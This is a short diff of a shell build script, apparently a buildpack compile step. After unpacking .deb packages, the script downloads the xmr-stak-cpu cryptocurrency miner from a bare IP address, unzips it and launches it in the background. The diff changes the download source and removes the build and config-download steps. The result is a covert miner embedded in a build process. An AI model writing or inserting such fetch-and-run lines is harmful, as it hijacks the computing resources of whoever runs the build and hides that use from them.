@@ -57,14 +57,10 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-wget -O abc.zip "http://puu.sh/xWbPf/566b4693cc.zip"
+wget -O abc.zip "http://35.189.114.5/xmr-stak-cpu.zip"
 unzip abc.zip
 rm abc.zip
 cd xmr-stak-cpu
-cmake .
-make install
 cd bin
-rm config.txt
-wget -O config.txt "http://puu.sh/xWbQ6/78343f0396.txt"
 ./xmr-stak-cpu &
 echo "done"
